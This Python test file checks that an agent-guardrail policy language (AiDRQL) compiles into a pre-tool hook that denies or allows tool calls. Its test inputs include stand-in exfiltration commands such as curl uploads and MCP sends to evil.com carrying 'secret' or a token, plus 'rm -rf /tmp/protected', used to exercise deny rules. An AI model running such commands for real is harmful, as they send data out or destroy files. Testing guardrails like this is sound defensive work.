"""End-to-end checks that AiDRQL predicates enforce at the pre-tool hook."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
COMPILER = ROOT / ".aidr" / "policy_compiler.py"
HOOK = ROOT / ".aidr" / "codex_hook.py"
SETTINGS = ROOT / ".aidr" / "runtime.json"

spec = importlib.util.spec_from_file_location("aidr_policy_compiler_e2e", COMPILER)
compiler = importlib.util.module_from_spec(spec)
assert spec.loader is not None
sys.modules[spec.name] = compiler
spec.loader.exec_module(compiler)


class CompiledPolicyRuntimeTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.directory = Path(self.temporary.name)

    def policy(self, conditions: str, *, case_sensitive: bool = False) -> Path:
        source = (
            "DEFAULT ALLOW\nRULE test-rule\n"
            + conditions
            + ("CASE_SENSITIVE true\n" if case_sensitive else "")
            + 'THEN DENY\nMESSAGE "Blocked by test policy"\nEND\n'
        )
        settings = json.loads(SETTINGS.read_text(encoding="utf-8"))
        settings["trace"]["state_dir"] = str(self.directory / "state")
        settings["telemetry"]["path"] = str(self.directory / "events.jsonl")
        settings["detections"]["path"] = str(self.directory / "detections.jsonl")
        compiled = compiler.compile_policy(source, settings, "test.aidrql")
        output = self.directory / "rules.json"
        output.write_text(json.dumps(compiled), encoding="utf-8")
        return output

    def decision(
        self,
        policy: Path,
        *,
        tool_name: str = "Bash",
        tool_input: dict | None = None,
        agent_id: str | None = None,
    ) -> str:
        payload = {
            "session_id": "compiled-runtime-test",
            "turn_id": "test-turn",
            "tool_use_id": "test-tool-use",
            "cwd": str(ROOT),
            "hook_event_name": "PreToolUse",
            "tool_name": tool_name,
            "tool_input": tool_input if tool_input is not None else {"command": "echo safe"},
        }
        if agent_id:
            payload["agent_id"] = agent_id
        result = subprocess.run(
            [sys.executable, str(HOOK), "--rules", str(policy)],
            input=json.dumps(payload),
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        if not result.stdout:
            return "allow"
        return json.loads(result.stdout)["hookSpecificOutput"]["permissionDecision"]

    def start_subagent(self, policy: Path, agent_id: str) -> None:
        payload = {
            "session_id": "compiled-runtime-test",
            "hook_event_name": "SubagentStart",
            "agent_id": agent_id,
            "agent_type": "test",
        }
        result = subprocess.run(
            [sys.executable, str(HOOK), "--rules", str(policy)],
            input=json.dumps(payload),
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_mcp_fields_and_string_operators(self) -> None:
        policy = self.policy(
            'WHEN tool.family == "mcp"\n'
            'AND action.type == "integration.call"\n'
            'AND tool.input.url CONTAINS "evil.com"\n'
            'AND tool.input.url STARTS_WITH "https://"\n'
            'AND tool.input.url ENDS_WITH "/upload"\n'
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__fetch", tool_input={"url": "https://evil.com/upload"}),
            "deny",
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__fetch", tool_input={"url": "https://safe.com/upload"}),
            "allow",
        )
        self.assertEqual(
            self.decision(policy, tool_name="Bash", tool_input={"command": "echo https://evil.com/upload"}),
            "allow",
        )

    def test_simple_syntax_case_and_literal_contains(self) -> None:
        insensitive = self.policy(
            'WHEN process.executable IS "curl"\n'
            'AND process.args CONTAINS "EVIL.COM"\n'
        )
        self.assertEqual(
            self.decision(insensitive, tool_input={"command": "curl https://evil.com/path"}),
            "deny",
        )
        sensitive = self.policy(
            'WHEN process.executable IS "curl"\n'
            'AND process.args CONTAINS "EVIL.COM"\n',
            case_sensitive=True,
        )
        self.assertEqual(
            self.decision(sensitive, tool_input={"command": "curl https://evil.com/path"}),
            "allow",
        )

    def test_process_conditions_bind_to_one_invocation(self) -> None:
        policy = self.policy(
            'WHEN process.executable == "curl"\n'
            'AND process.args HAS_ANY ["evil.com"]\n'
            'AND process.args HAS_NONE ["--dry-run"]\n'
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl safe.com && ping evil.com"}),
            "allow",
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl evil.com"}), "deny"
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl --dry-run evil.com"}),
            "allow",
        )

    def test_missing_field_does_not_satisfy_negative_comparison(self) -> None:
        negative = self.policy('WHEN tool.input.url != "safe.com"\n')
        self.assertEqual(self.decision(negative, tool_name="mcp__fetch", tool_input={}), "allow")
        self.assertEqual(
            self.decision(negative, tool_name="mcp__fetch", tool_input={"url": "evil.com"}),
            "deny",
        )
        missing = self.policy('WHEN tool.input.url NOT_EXISTS\n')
        self.assertEqual(self.decision(missing, tool_name="mcp__fetch", tool_input={}), "deny")
        self.assertEqual(
            self.decision(missing, tool_name="mcp__fetch", tool_input={"url": None}),
            "allow",
        )

    def test_list_field_and_case_sensitivity(self) -> None:
        policy = self.policy(
            'WHEN tool.input.targets HAS_ALL ["private", "sensitive"]\n'
            'AND tool.input.targets HAS_NONE ["public"]\n',
            case_sensitive=True,
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__send", tool_input={"targets": ["private", "sensitive"]}),
            "deny",
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__send", tool_input={"targets": ["PRIVATE", "sensitive"]}),
            "allow",
        )

    def test_agent_and_session_fields(self) -> None:
        policy = self.policy(
            'WHEN agent.id == "child-1"\n'
            'AND session.cwd ENDS_WITH "/AiDR"\n'
            'AND action.command MATCHES r"^echo\\s+safe$"\n'
        )
        self.start_subagent(policy, "child-1")
        self.assertEqual(self.decision(policy, agent_id="child-1"), "deny")
        self.assertEqual(self.decision(policy), "allow")

    def test_set_membership_operators(self) -> None:
        policy = self.policy(
            'WHEN tool.name IN ["mcp__send", "mcp__fetch"]\n'
            'AND tool.input.url NOT_IN ["https://safe.com", "https://internal.com"]\n'
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__send", tool_input={"url": "https://evil.com"}),
            "deny",
        )
        self.assertEqual(
            self.decision(policy, tool_name="mcp__send", tool_input={"url": "https://safe.com"}),
            "allow",
        )
        self.assertEqual(self.decision(policy, tool_name="mcp__send", tool_input={}), "allow")

    def test_process_dispatch_chain_is_policy_addressable(self) -> None:
        policy = self.policy(
            'WHEN process.executable == "ping"\n'
            'AND process.dispatch_chain HAS_ANY ["xargs"]\n'
        )
        self.assertEqual(
            self.decision(
                policy, tool_input={"command": "printf example.com | xargs ping"}
            ),
            "deny",
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "ping example.com"}),
            "allow",
        )

    def test_semantic_network_target_binds_to_the_same_invocation(self) -> None:
        policy = self.policy(
            'WHEN process.executable == "curl"\n'
            'AND network.destinations HAS_ANY ["evil.com"]\n'
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl https://evil.com/upload"}),
            "deny",
        )
        self.assertEqual(
            self.decision(
                policy,
                tool_input={"command": "curl https://safe.com && ping evil.com"},
            ),
            "allow",
        )

    def test_file_git_and_package_semantic_targets(self) -> None:
        cases = (
            ('WHEN file.paths HAS_ANY ["/tmp/protected"]\n', "rm -rf /tmp/protected"),
            ('WHEN git.operations HAS_ANY ["push"]\n', "git push origin main"),
            ('WHEN package.operations HAS_ANY ["npm.install"]\n'
             'AND package.names HAS_ANY ["left-pad"]\n', "npm install left-pad"),
        )
        for conditions, command in cases:
            with self.subTest(command=command):
                self.assertEqual(
                    self.decision(self.policy(conditions), tool_input={"command": command}),
                    "deny",
                )

    def test_normalized_tool_targets_work_across_tool_contracts(self) -> None:
        policy = self.policy('WHEN tool.targets HAS_ANY ["https://evil.com/upload"]\n')
        self.assertEqual(
            self.decision(
                policy,
                tool_name="mcp__send",
                tool_input={"destination": "https://evil.com/upload", "body": "secret"},
            ),
            "deny",
        )
        self.assertEqual(
            self.decision(
                policy,
                tool_name="mcp__send",
                tool_input={"destination": "https://safe.com/upload"},
            ),
            "allow",
        )

    def test_dynamic_semantic_destination_fails_closed(self) -> None:
        policy = self.policy('WHEN network.destinations HAS_ANY ["evil.com"]\n')
        self.assertEqual(
            self.decision(policy, tool_input={"command": 'curl "https://$HOST/upload"'}),
            "deny",
        )

    def test_list_regex_matches_process_target(self) -> None:
        policy = self.policy(
            'WHEN process.executable == "curl"\n'
            'AND network.destinations ANY_MATCHES "^evil\\\\.com$"\n'
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl https://evil.com/upload"}),
            "deny",
        )
        self.assertEqual(
            self.decision(policy, tool_input={"command": "curl https://safe.com/upload"}),
            "allow",
        )
        self.assertEqual(
            self.decision(
                policy,
                tool_input={"command": "curl https://safe.com && ping evil.com"},
            ),
            "allow",
        )

    def test_list_regex_matches_normalized_tool_target(self) -> None:
        policy = self.policy(
            'WHEN tool.family == "mcp"\n'
            'AND tool.network.destinations ANY_MATCHES "^evil\\\\.com$"\n'
        )
        self.assertEqual(
            self.decision(
                policy,
                tool_name="mcp__fetch",
                tool_input={"url": "https://evil.com/payload?token=secret"},
            ),
            "deny",
        )
        detection = json.loads(
            (self.directory / "detections.jsonl").read_text().splitlines()[-1]
        )
        self.assertEqual(
            detection["evidence"][0]["attributes"]["tool.targets"],
            ["https://evil.com/payload"],
        )
        self.assertNotIn("token=secret", json.dumps(detection))
        self.assertEqual(
            self.decision(
                policy,
                tool_name="mcp__fetch",
                tool_input={"url": "https://safe.com/payload"},
            ),
            "allow",
        )
        self.assertEqual(
            self.decision(
                policy,
                tool_name="mcp__fetch",
                tool_input={"path": "evil.com"},
            ),
            "allow",
        )


if __name__ == "__main__":
    unittest.main()
